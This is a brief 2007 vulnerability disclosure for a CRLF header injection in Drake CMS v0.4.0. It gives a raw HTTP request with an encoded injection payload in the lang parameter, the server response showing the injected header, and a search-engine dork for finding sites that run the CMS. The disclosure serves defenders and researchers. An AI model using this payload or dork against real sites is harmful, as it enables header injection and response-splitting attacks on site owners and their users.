Drake CMS (v0.4.0) - CRLF Injection Vulnerability

Vulnerable files: index.php


HTTP Request:
-------------

POST /index.php?lang=%0d%0aINJECTEDHEADER%3Ainjecteddata HTTP/1.0
Accept: */*
Content-Type: application/x-www-form-urlencoded
User-Agent: Browser/1.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)
Host: drakecms.sourceforge.net
Content-Length: 121
Cookie: PHPSESSID=510885055;user_lang=sk
Connection: Close
Pragma: no-cache

PHPSESSID=510885055&username=111-222-1933email@address.com&password=111-222-1933email@address.com&task=login&remember=off

HTTP Response:
--------------

HTTP/1.1 200 OK
Date: Sun, 06 May 2007 01:20:14 GMT
Server: Apache/1.3.33 (Unix) PHP/4.3.10
X-Powered-By: PHP/4.3.10
Set-Cookie: PHPSESSID=510885055; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Set-Cookie: user_lang=deleted; expires=Sat, 06-May-06 01:20:13 GMT
Content-Language
INJECTEDHEADER: injecteddata
Connection: close
Content-Type: text/html; charset=UTF-8


Vulnerable: v0.4.0 (others may also be affected)
Google d0rk: "Powered by Drake CMS"

John Martinelli
john@martinelli.com
http://john-martinelli.com

May 5th, 2007
